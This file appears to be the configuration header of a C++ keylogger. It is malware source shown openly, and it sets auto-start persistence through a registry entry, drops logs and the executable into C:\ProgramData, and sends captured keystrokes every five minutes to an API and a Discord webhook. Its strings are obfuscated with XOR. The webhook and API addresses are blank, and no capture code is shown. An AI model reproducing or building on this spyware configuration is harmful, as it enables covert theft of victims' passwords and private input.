#pragma once
#include "c_includes.hpp"

//keylogger config archive

namespace c_config {
	inline bool debug = false; //debug mode

	namespace init {
		inline bool auto_run = true; //auto start with pc

		inline std::string destination_path = c_xor("C:\\ProgramData\\"); //the logs destination + auto-start exe

		inline std::string reg_name = c_xor("cppklg"); //the reg name of the identifier
	}

	namespace sender {
		inline bool send_api = true; //auto send to api
		inline bool send_webhook = true;  //auto send to discord webhook

		inline int minute_delay = 5; //the delay minutes of the requests thing

		inline std::string api_link = c_xor(""); //api link
		inline std::string webhook_link = c_xor(""); //discord webhook link, may bug
	}
}